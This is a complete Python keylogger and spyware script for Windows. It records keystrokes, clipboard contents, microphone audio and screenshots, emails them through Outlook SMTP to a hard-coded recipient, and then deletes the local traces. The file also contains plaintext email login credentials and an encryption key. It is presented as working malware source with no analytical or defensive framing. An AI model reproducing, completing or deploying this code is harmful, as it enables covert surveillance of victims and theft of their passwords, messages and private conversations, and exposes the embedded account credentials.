# Libraries
import os
import socket
import platform
import getpass
import time
import smtplib
import sounddevice as sd
from PIL import ImageGrab
from requests import get
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from multiprocessing import Process, freeze_support
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
from cryptography.fernet import Fernet
import win32clipboard

# Global Variables
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
time_interval = 20
number_of_screenshots = 3
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
print("System initialize" + str(time.time()))

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

email_address = "userattch2023@outlook.com"
password = "yihkwprettuxwxgw"
username = getpass.getuser()
toaddr = "user.attch@gmail.com"
key = "s-bIgdAv5W40sFub7iBRCrk9JDEsyXZmJ3DRc2ND6Ok="

file_path = "C:\\Users\\danie\\Desktop\\KEYLOGGER\\Project"
extend = "\\"
file_merge = file_path + extend
with open(file_path + extend + keys_information, "w") as f:
    f.write(" ")

# Email Functionality
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(attachment, "rb")

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp-mail.outlook.com', 587)
    s.starttls()
    s.login(fromaddr, password)

    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

# Computer Information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address")
        f.write(" Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + "" + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address " + IPAddr + '\n')

# Clipboard Information
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied")

# Microphone
def microphone():
    fs = 44100
    myrecording = sd.rec(int(time_interval * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)

# Screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# Keylogger Functions
keys = []
count = 0
def on_press(key):
    global keys, count, currentTime
    keys.append(key)
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
        return False

# Timer for Keylogger
number_of_iterations = 0
currentTime = time.time()
screenshot_time = time_interval / number_of_screenshots
stoppingTime = time.time() + time_interval

while number_of_iterations < number_of_screenshots:

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        
    microphone()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + screenshot_time

#time.sleep(30)
send_email(audio_information, file_path + extend + audio_information, toaddr)
send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
send_email("key_log.txt", file_path + extend + keys_information, toaddr)
# Clean up and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]

for file in delete_files:
    os.remove(file_merge + file)